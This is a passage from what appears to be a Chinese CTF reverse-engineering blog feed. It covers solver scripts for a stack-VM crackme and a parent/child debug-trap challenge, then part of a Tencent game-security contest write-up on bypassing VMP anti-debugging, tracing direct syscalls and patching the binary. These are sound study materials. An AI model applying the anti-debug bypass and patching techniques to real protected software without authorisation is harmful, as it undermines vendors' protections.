class="hljs-number">0xc24c</span><br>[<span class="hljs-number">69</span>]<br>push <span class="hljs-number">0x87</span><br>[<span class="hljs-number">72</span>]<br>push <span class="hljs-number">0xeec7</span><br>[<span class="hljs-number">75</span>]<br>push <span class="hljs-number">0x26</span><br>[<span class="hljs-number">78</span>]<br>push <span class="hljs-number">0x8b53</span><br>[<span class="hljs-number">81</span>]<br>push <span class="hljs-number">0x106</span><br>[<span class="hljs-number">84</span>]<br>push <span class="hljs-number">0x9141</span><br>[<span class="hljs-number">87</span>]<br>push <span class="hljs-number">0x10e</span><br>[<span class="hljs-number">90</span>]<br>push <span class="hljs-number">0xb7a1</span><br>[<span class="hljs-number">93</span>]<br>push <span class="hljs-number">0x9d</span><br>[<span class="hljs-number">96</span>]<br>push <span class="hljs-number">0xd3d6</span><br>[<span class="hljs-number">99</span>]<br>push <span class="hljs-number">0x77</span><br>[<span class="hljs-number">102</span>]<br>push <span class="hljs-number">0xae54</span><br>[<span class="hljs-number">105</span>]<br>push <span class="hljs-number">0xcf</span><br>[<span class="hljs-number">108</span>]<br>push <span class="hljs-number">0x992d</span><br>[<span class="hljs-number">111</span>]<br>push <span class="hljs-number">0xf6</span><br>[<span class="hljs-number">114</span>]<br>push <span class="hljs-number">0xbaae</span><br>[<span class="hljs-number">117</span>]<br>push <span class="hljs-number">0xa9</span><br>[<span class="hljs-number">120</span>]<br>push <span class="hljs-number">0xa767</span><br>[<span class="hljs-number">123</span>]<br>push <span class="hljs-number">0xd2</span><br>[<span class="hljs-number">126</span>]<br>push <span class="hljs-number">0xa631</span><br>[<span class="hljs-number">129</span>]<br>push <span class="hljs-number">0xf2</span><br>[<span class="hljs-number">132</span>]<br>push <span class="hljs-number">0xeea1</span><br>[<span class="hljs-number">135</span>]<br>push <span class="hljs-number">0x26</span><br>[<span class="hljs-number">138</span>]<br>push <span class="hljs-number">0x87e4</span><br>[<span class="hljs-number">141</span>]<br>push <span class="hljs-number">0x115</span><br>[<span class="hljs-number">144</span>]<br>push <span class="hljs-number">0xf24a</span><br>[<span class="hljs-number">147</span>]<br>push <span class="hljs-number">0x1d</span><br>[<span class="hljs-number">150</span>]<br>push <span class="hljs-number">0xc382</span><br>[<span class="hljs-number">153</span>]<br>push <span class="hljs-number">0xa3</span><br>[<span class="hljs-number">156</span>]<br>push <span class="hljs-number">0x9021</span><br>[<span class="hljs-number">159</span>]<br>push <span class="hljs-number">0x102</span><br>[<span class="hljs-number">162</span>]<br>push <span class="hljs-number">0xb94b</span><br>[<span class="hljs-number">165</span>]<br>push <span class="hljs-number">0xb5</span><br>[<span class="hljs-number">168</span>]<br>push <span class="hljs-number">0xcba0</span><br>[<span class="hljs-number">171</span>]<br>push <span class="hljs-number">0x6d</span><br>[<span class="hljs-number">174</span>]<br>push <span class="hljs-number">0x867d</span><br>[<span class="hljs-number">177</span>]<br>push <span class="hljs-number">0x12e</span><br>[<span class="hljs-number">180</span>]<br>push <span class="hljs-number">0xa570</span><br>[<span class="hljs-number">183</span>]<br>push <span class="hljs-number">0xef</span><br>[<span class="hljs-number">186</span>]<br>push <span class="hljs-number">0xc7e3</span><br>[<span class="hljs-number">189</span>]<br>push <span class="hljs-number">0x85</span><br>[<span class="hljs-number">192</span>]<br>push <span class="hljs-number">0xf0db</span><br>[<span class="hljs-number">195</span>]<br>push <span class="hljs-number">0x26</span><br>[<span class="hljs-number">198</span>]<br>mov ax, *flag++<br>push ax<br>[<span class="hljs-number">199</span>]<br>pop ax<br>push ax<br>push ax<br>[<span class="hljs-number">200</span>]<br>pop ax<br>test ax, ax<br>movz pc, <span class="hljs-number">212</span><br>[<span class="hljs-number">203</span>]<br>pop ax<br>pop bx<br>mul ax, bx<br>push ax<br>[<span class="hljs-number">204</span>]<br>pop ax<br>pop bx<br>xor ax, bx<br>push ax<br>[<span class="hljs-number">205</span>]<br>pop ax<br>inc ax<br>push ax<br>[<span class="hljs-number">206</span>]<br>pop ax<br>test ax, ax<br>movz pc, <span class="hljs-number">198</span><br>[<span class="hljs-number">209</span>]<br>ret rom[pc]<br>[<span class="hljs-number">210</span>]<br>error<br>[<span class="hljs-number">211</span>]<br>error<br>[<span class="hljs-number">212</span>]<br>pop ax<br>[<span class="hljs-number">213</span>]<br>test sp, bp<br>movz pc, <span class="hljs-number">219</span><br>[<span class="hljs-number">216</span>]<br>ret rom[pc]<br>[<span class="hljs-number">217</span>]<br>error<br>[<span class="hljs-number">218</span>]<br>error<br>[<span class="hljs-number">219</span>]<br>ret rom[pc]<br>[<span class="hljs-number">220</span>]<br>error<br>[<span class="hljs-number">221</span>]<br>error<br></code></pre></td></tr></table></figure><p>逻辑很简单，先压32*2个数到栈里面，然后依次从flag取一个字节，先检查是否为空字符，是空字符直接返回，否则跟栈里的数先做乘法，再做异或，最后+1检查是否为0，为0循环，返回的时候会检查栈空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">ls = [<br><span class="hljs-number">0x8205</span>, <span class="hljs-number">0x102</span>,<br><span class="hljs-number">0xa541</span>, <span class="hljs-number">0xe6</span>,<br><span class="hljs-number">0xa02d</span>, <span class="hljs-number">0xdf</span>,<br><span class="hljs-number">0xcb16</span>, <span class="hljs-number">0x81</span>,<br><span class="hljs-number">0xbc8f</span>, <span class="hljs-number">0xa6</span>,<br><span class="hljs-number">0xc0f6</span>, <span class="hljs-number">0xa3</span>,<br><span class="hljs-number">0xb06d</span>, <span class="hljs-number">0xd2</span>,<br><span class="hljs-number">0x9da4</span>, <span class="hljs-number">0xe7</span>,<br><span class="hljs-number">0xd2b9</span>, <span class="hljs-number">0x7a</span>,<br><span class="hljs-number">0xb47b</span>, <span class="hljs-number">0xb3</span>,<br><span class="hljs-number">0xcaf3</span>, <span class="hljs-number">0x8c</span>,<br><span class="hljs-number">0xc24c</span>, <span class="hljs-number">0x87</span>,<br><span class="hljs-number">0xeec7</span>, <span class="hljs-number">0x26</span>,<br><span class="hljs-number">0x8b53</span>, <span class="hljs-number">0x106</span>,<br><span class="hljs-number">0x9141</span>, <span class="hljs-number">0x10e</span>,<br><span class="hljs-number">0xb7a1</span>, <span class="hljs-number">0x9d</span>,<br><span class="hljs-number">0xd3d6</span>, <span class="hljs-number">0x77</span>,<br><span class="hljs-number">0xae54</span>, <span class="hljs-number">0xcf</span>,<br><span class="hljs-number">0x992d</span>, <span class="hljs-number">0xf6</span>,<br><span class="hljs-number">0xbaae</span>, <span class="hljs-number">0xa9</span>,<br><span class="hljs-number">0xa767</span>, <span class="hljs-number">0xd2</span>,<br><span class="hljs-number">0xa631</span>, <span class="hljs-number">0xf2</span>,<br><span class="hljs-number">0xeea1</span>, <span class="hljs-number">0x26</span>,<br><span class="hljs-number">0x87e4</span>, <span class="hljs-number">0x115</span>,<br><span class="hljs-number">0xf24a</span>, <span class="hljs-number">0x1d</span>,<br><span class="hljs-number">0xc382</span>, <span class="hljs-number">0xa3</span>,<br><span class="hljs-number">0x9021</span>, <span class="hljs-number">0x102</span>,<br><span class="hljs-number">0xb94b</span>, <span class="hljs-number">0xb5</span>,<br><span class="hljs-number">0xcba0</span>, <span class="hljs-number">0x6d</span>,<br><span class="hljs-number">0x867d</span>, <span class="hljs-number">0x12e</span>,<br><span class="hljs-number">0xa570</span>, <span class="hljs-number">0xef</span>,<br><span class="hljs-number">0xc7e3</span>, <span class="hljs-number">0x85</span>,<br><span class="hljs-number">0xf0db</span>, <span class="hljs-number">0x26</span><br>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ls)-<span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">2</span>):<br>    a = ls[i]<br>    b = ls[i+<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># (b * f) ^ a = 0xFFFF</span><br>    f = ((<span class="hljs-number">0xFFFF</span> ^ a) // b) &amp; <span class="hljs-number">0xFF</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(f), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Time-Machine"><a href="#Time-Machine" class="headerlink" title="Time_Machine"></a>Time_Machine</h2><p>这题比赛中没打完，挺有意思的父子进程题目</p><p>这道题ida的反编译很烂，看反编译分析干扰项太多</p><p>没有符号，先字符串定位</p><p><img src="assets/2024-03-30-23-22-43-image.png"></p><p><img src="assets/2024-03-30-23-23-13-image.png"></p><p>提示输入<code>Enter The Flag:\n</code>跟提示flag正确<code>Correct Flag :)\n</code>不在同一个地方</p><p>输入的地方结尾有个函数指针，下断点但是断不下来，交叉引用找入口</p><p><img src="assets/2024-03-30-23-27-40-image.png"></p><p>这里就是主函数，根据环境变量<code>qazqweedccxz</code>决定进入的分支，当该环境变量存在的时，进入输入分支，看看另一个分支</p><p><img src="assets/2024-03-30-23-29-35-image.png"></p><p><img src="assets/2024-03-30-23-30-54-image.png"></p><p>设置环境变量<code>qazqweedccxz=1</code>，然后开一个子进程并调试，子进程进输入分支，难怪断不下来，重新在main分支的地方下断点，手动进子进程分支，看看结尾出函数指针在干嘛</p><p><img src="assets/2024-03-30-23-35-14-image.png"></p><p>从输入的flag里取一个字节，也没发现有什么校验逻辑，但注意到<code>ud2</code>指令(<code>0F 0B</code>)，运行到该指令会触发异常，由于父进程在调试子进程，所有分析父进程的操作逻辑</p><p><strong>EXCEPTION_DEBUG_EVENT &#x3D; 1</strong></p><p><img src="assets/2024-03-30-23-38-52-image.png"></p><p>当调试出现异常时进入前面看到的输出<code>Correct Flag :)\n</code>的函数</p><p>断点调试一下</p><p>先是获取寄存器信息</p><p><img src="assets/2024-03-30-23-43-19-image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT</span> &#123;</span><br>  DWORD64 P1Home;<br>  DWORD64 P2Home;<br>  DWORD64 P3Home;<br>  DWORD64 P4Home;<br>  DWORD64 P5Home;<br>  DWORD64 P6Home;<br>  DWORD   ContextFlags;<br>  DWORD   MxCsr;<br>  WORD    SegCs;<br>  WORD    SegDs;<br>  WORD    SegEs;<br>  WORD    SegFs;<br>  WORD    SegGs;<br>  WORD    SegSs;<br>  DWORD   EFlags;<br>  DWORD64 Dr0;<br>  DWORD64 Dr1;<br>  DWORD64 Dr2;<br>  DWORD64 Dr3;<br>  DWORD64 Dr6;<br>  DWORD64 Dr7;<br>  DWORD64 Rax;<br>  DWORD64 Rcx;<br>  DWORD64 Rdx;<br>  DWORD64 Rbx;<br>  DWORD64 Rsp;<br>  DWORD64 Rbp;<br>  DWORD64 Rsi;<br>  DWORD64 Rdi;<br>  DWORD64 R8;<br>  DWORD64 R9;<br>  DWORD64 R10;<br>  DWORD64 R11;<br>  DWORD64 R12;<br>  DWORD64 R13;<br>  DWORD64 R14;<br>  DWORD64 R15;<br>  DWORD64 Rip;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    XMM_SAVE_AREA32 FltSave;<br>    NEON128         Q[<span class="hljs-number">16</span>];<br>    ULONGLONG       D[<span class="hljs-number">32</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>      M128A Header[<span class="hljs-number">2</span>];<br>      M128A Legacy[<span class="hljs-number">8</span>];<br>      M128A Xmm0;<br>      M128A Xmm1;<br>      M128A Xmm2;<br>      M128A Xmm3;<br>      M128A Xmm4;<br>      M128A Xmm5;<br>      M128A Xmm6;<br>      M128A Xmm7;<br>      M128A Xmm8;<br>      M128A Xmm9;<br>      M128A Xmm10;<br>      M128A Xmm11;<br>      M128A Xmm12;<br>      M128A Xmm13;<br>      M128A Xmm14;<br>      M128A Xmm15;<br>    &#125; DUMMYSTRUCTNAME;<br>    DWORD           S[<span class="hljs-number">32</span>];<br>  &#125; DUMMYUNIONNAME;<br>  M128A   VectorRegister[<span class="hljs-number">26</span>];<br>  DWORD64 VectorControl;<br>  DWORD64 DebugControl;<br>  DWORD64 LastBranchToRip;<br>  DWORD64 LastBranchFromRip;<br>  DWORD64 LastExceptionToRip;<br>  DWORD64 LastExceptionFromRip;<br>&#125; CONTEXT, *PCONTEXT;<br></code></pre></td></tr></table></figure><p>然后是读两个字节的内存</p><p><img src="assets/2024-03-30-23-45-13-image.png"></p><p>计算一下这里的偏移，<code>lpContext+0xF8</code>，刚好是RIP的偏移，即从读两字节出错的指令</p><p><img src="assets/2024-03-31-00-10-03-1.png"></p><p>接着检查这两个字节是否为<code>0F 0B</code>，很巧，刚好是子进程中的<code>ud2</code>，很明显这里在捕获子进程在<code>ud2</code>指令出错</p><p><img src="assets/2024-03-30-23-49-49-image.png"></p><p>第一次异常不是<code>ud2</code>，直接退出了，F9接着调，中间很像flag校验的地方，先忽略，看后面写内存的地方</p><p><img src="assets/2024-03-30-23-52-57-image.png"></p><p>往RIP写两个字节<code>0x90</code>，把出错的<code>ud2</code>直接<code>nop</code>掉了</p><p><img src="assets/2024-03-30-23-55-51-image.png"></p><p>父进程调试子进程思路基本明确，子进程靠错误指令<code>ud2</code>触发异常，父进程<code>nop</code>掉异常指令恢复子进程运行</p><p>接下来分析中间的校验部分</p><p><img src="assets/2024-03-31-00-13-07-image.png"></p><p>取r12b，进行加密操作后结果与r11d校验，最后检查r13是否为1，两个校验都通过，计数器+1，计数器等于0x1C时输出正确</p><p>分析一下加密函数</p><p><img src="assets/2024-03-31-00-14-47-image.png"></p><p>因为输入的只有1个字节，中间只会case 1</p><p>直接把1字节的256中结果全算出来，后面直接查表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">m = &#123;&#125;<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    l1 = <span class="hljs-number">1</span><br>    l2 = ((c + l1) &lt;&lt; <span class="hljs-number">10</span>) ^ (c + l1)<br>    l1 = (l2 &gt;&gt; <span class="hljs-number">1</span>) + l2<br>    l3 = (((<span class="hljs-number">8</span> * l1) ^ l1) &gt;&gt; <span class="hljs-number">5</span>) + ((<span class="hljs-number">8</span> * l1) ^ l1)<br>    l3 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    l4 = (((<span class="hljs-number">16</span> * l3) ^ l3) &gt;&gt; <span class="hljs-number">17</span>) + ((<span class="hljs-number">16</span> * l3) ^ l3)<br>    l4 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    r = (l4 &lt;&lt; <span class="hljs-number">25</span>) ^ l4<br>    r &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    r = (r &gt;&gt; <span class="hljs-number">6</span>) + r<br>    r &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c), <span class="hljs-built_in">hex</span>(r))<br>    m[r] = c<br></code></pre></td></tr></table></figure><p>回到子进程的奇怪代码</p><p><img src="assets/2024-03-31-00-17-50-image.png"></p><p>现在就知道子进程在干嘛了，先从flag取一个字节到r12b，再计算r11d，给r13赋值，前面分析父进程知道只有在<code>r13==1</code>时才进行校验，用idapython解析一下，在<code>r13==1</code>时查表r11d得到r12b，即得到flag的一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><br>m = &#123;&#125;<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    l1 = <span class="hljs-number">1</span><br>    l2 = ((c + l1) &lt;&lt; <span class="hljs-number">10</span>) ^ (c + l1)<br>    l1 = (l2 &gt;&gt; <span class="hljs-number">1</span>) + l2<br>    l3 = (((<span class="hljs-number">8</span> * l1) ^ l1) &gt;&gt; <span class="hljs-number">5</span>) + ((<span class="hljs-number">8</span> * l1) ^ l1)<br>    l3 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    l4 = (((<span class="hljs-number">16</span> * l3) ^ l3) &gt;&gt; <span class="hljs-number">17</span>) + ((<span class="hljs-number">16</span> * l3) ^ l3)<br>    l4 &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    r = (l4 &lt;&lt; <span class="hljs-number">25</span>) ^ l4<br>    r &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    r = (r &gt;&gt; <span class="hljs-number">6</span>) + r<br>    r &amp;= <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(c), <span class="hljs-built_in">hex</span>(r))<br>    m[r] = c<br><br>start = <span class="hljs-number">0x7FF670FF3088</span><br>end = start + <span class="hljs-number">0x286F</span><br><br>ea = start<br><span class="hljs-keyword">while</span> (ea &lt; end):<br>    <span class="hljs-comment"># mov r12b, [rcx+i]</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    <span class="hljs-keyword">if</span> (ins == <span class="hljs-string">&quot;retn&quot;</span>):<br>        <span class="hljs-keyword">break</span><br>    ea += ins_len<br>    <span class="hljs-comment"># mov r11, k</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    k1 = idc.print_operand(ea, <span class="hljs-number">1</span>)<br>    k1 = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span>+k1[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    ea += ins_len<br>    <span class="hljs-comment"># xor r11, k</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    k2 = idc.print_operand(ea, <span class="hljs-number">1</span>)<br>    k2 = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span>+k2[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    ea += ins_len<br>    <span class="hljs-comment"># ror r11, k</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    k3 = idc.print_operand(ea, <span class="hljs-number">1</span>)<br>    k3 = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;0x&quot;</span>+k3[:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>    ea += ins_len<br>    r11 = (((k1 ^ k2) &gt;&gt; k3) | ((k1 ^ k2) &lt;&lt; (<span class="hljs-number">64</span> - k3))) &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFF</span><br>    <span class="hljs-comment"># mov r13, 0/1</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    r13 = idc.print_operand(ea, <span class="hljs-number">1</span>)<br>    r13 = <span class="hljs-built_in">int</span>(r13)<br>    ea += ins_len<br>    <span class="hljs-comment"># ud2</span><br>    ins_len = idc.create_insn(ea)<br>    ins = idc.generate_disasm_line(ea, <span class="hljs-number">0</span>) <br>    ea += ins_len<br>    <span class="hljs-keyword">if</span> (r13 == <span class="hljs-number">1</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(m[r11]), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="assets/2024-03-31-00-20-40-image.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>腾讯游戏安全竞赛2023-PC初赛</title>
    <link href="/2024/02/14/ctf_wp/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2023-PC%E5%88%9D%E8%B5%9B/"/>
    <url>/2024/02/14/ctf_wp/%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B2023-PC%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>DIE查壳，vmp，<del>删题跑路</del></p><p><img src="assets/2024-03-29-12-06-08-image.png"></p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><h4 id="定位main"><a href="#定位main" class="headerlink" title="定位main"></a>定位main</h4><p>VMP反调直接拿ScyllaHide过掉，运行一段时间后暂停下来看调用栈</p><p><img src="assets/2024-03-29-12-09-10-image.png"></p><p>定位到main</p><p><img src="assets/2024-03-29-12-10-59-image.png"></p><p>main被虚拟化了</p><p><img src="assets/2024-03-29-12-11-56-image.png"></p><p>重点看call，找到sleep返回的地方</p><p><img src="assets/2024-03-29-12-14-27-image.png"></p><p>这一段两个call，下断点看程序反应，第一个call断下，把程序输出的文件删掉，单步跳过之后生成了文件，说明主要逻辑在第一个call里面，第二个call单纯的sleep</p><h4 id="定位API操作"><a href="#定位API操作" class="headerlink" title="定位API操作"></a>定位API操作</h4><p>对CreateFile、WriteFile下断点，发现程序断不下来，说明文件操作绕过了系统API，拿火绒剑监控一下，能监控到文件操作</p><p><img src="assets/2024-03-29-12-20-28-image.png"></p><p>FILE_touch</p><p><img src="assets/2024-03-29-12-22-14-image.png"></p><p>FILE_write</p><p><img src="assets/2024-03-29-12-25-56-image.png"></p><p>FILE_modified</p><p><img src="assets/2024-03-29-12-25-24-image.png"></p><p>直接由syscall实现了，难怪下断点抓不到，对FILE_touch和FILE_write的syscall下断点</p><p><img src="assets/2024-03-29-12-28-10-image.png"></p><p><img src="assets/2024-03-29-12-30-15-image.png"></p><p><img src="assets/2024-03-29-12-33-10-image.png"></p><p>通过调用栈没法回溯，还是得回到程序里写文件的部分</p><p>看写文件的函数，还是虚拟化</p><p><img src="assets/2024-03-29-12-16-59-image.png"></p><p>对含call的块下断点</p><p><img src="assets/2024-03-29-12-18-28-image.png"></p><p>然后F9，看CreateFile、WriteFile、Close分别在哪个块里面被call，再对块里面的call下断点，定位具体调用位置</p><p>CreateFile，参数在栈里面</p><p><img src="assets/2024-03-29-12-36-59-image.png"></p><p>WriteFile跟CloseHandle在一个块里面，WriteFile的参数也在栈里面</p><p><img src="assets/2024-03-29-12-38-36-image.png"></p><p>手动改一下CreateFile与WriteFile栈里面的内容，看看有没有效果</p><p><img src="assets/2024-03-29-12-42-29-image.png"></p><p><img src="assets/2024-03-29-12-44-06-image.png"></p><p><img src="assets/2024-03-29-12-44-36-image.png"></p><p>看样子CreateFile、WriteFile都找到了</p><h4 id="定位文件名"><a href="#定位文件名" class="headerlink" title="定位文件名"></a>定位文件名</h4><p>回到调用CreateFile的地方，看栈里面的文件名从哪来的</p><p><img src="assets/2024-03-29-12-48-01-image.png"></p><p><code>lea rcx, ds:[0x00007FF79B3A72FA]</code></p><p><img src="assets/2024-03-29-12-49-53-image.png"></p><p>找到文件名了，但这玩意在变，下个硬件断点看哪在改它</p><p><img src="assets/2024-03-29-12-52-48-image.png"></p><p>xor了一个<code>@</code>，文件名前一个字符，整个文件名都做了异或</p><h4 id="定位flag"><a href="#定位flag" class="headerlink" title="定位flag"></a>定位flag</h4><p>在文件名前面有这么一串东西</p><p><img src="assets/2024-03-29-12-55-01-image.png"></p><p><code>catchmeifyoucan</code>，这应该就是明文flag</p><p>从WriteFile处的密文逆一下</p><p><img src="assets/2024-03-29-12-57-42-image.png"></p><p>密文在[rbp-38]里面，函数局部变量，运行了几次都在变，那直接下硬件断点看哪在写这个局部变量</p><p><img src="assets/2024-03-29-13-01-30-image.png"></p><p>分析一下这里是分配内存，大小0x41，再对分配的内存下断点，看哪写了分配的内存</p><p><img src="assets/2024-03-29-13-03-49-image.png"></p><p>这里在做写零操作，应该是把内存初始化为0，继续看还有哪在写</p><p><img src="assets/2024-03-29-13-05-23-image.png"></p><p>不再之前的函数里面了，回溯一下</p><p><img src="assets/2024-03-29-13-06-47-image.png"></p><p>rcx是之前看到的flag，edx&#x3D;0xF，刚好是flag长度，r8是之前分配的内存</p><p>简单看一下，这里调用的是base64加密</p><p><img src="assets/2024-03-29-13-11-32-image.png"></p><p><img src="assets/2024-03-29-13-12-33-image.png"></p><p>破案了，flag确实是<code>catchmeifyoucan</code></p><p>内存里除了加密的flag，还有下面一串怪东西</p><p><img src="assets/2024-03-29-13-13-48-image.png"></p><p><img src="assets/2024-03-29-13-14-37-image.png"></p><p><img src="assets/2024-03-29-13-15-33-image.png"></p><p>断点分析一下，其实和文件名一样，flag被拿前面的<code>E</code>做了下异或</p><p><img src="assets/2024-03-29-13-17-00-image.png"></p><h3 id="PATCH"><a href="#PATCH" class="headerlink" title="PATCH"></a>PATCH</h3><h4 id="filename-patch"><a href="#filename-patch" class="headerlink" title="filename patch"></a>filename patch</h4><p>前面分析了文件名的位置</p><p><img src="assets/2024-03-29-13-20-47-2024-03-29-12-48-01-image.png"></p><p>rcx就是文件名，文件名偏移<code>0x772F9</code>，为了避免异或的影响，文件名前面的字节改成0</p><p>但是原文件名长度有限，想任意文件名需要把文件名写到其它内存中，再把文件名地址传给rcx，为了不过多修改代码，考虑将新文件名的地址存在原文件名的地方，把lea指令patch成mov指令</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 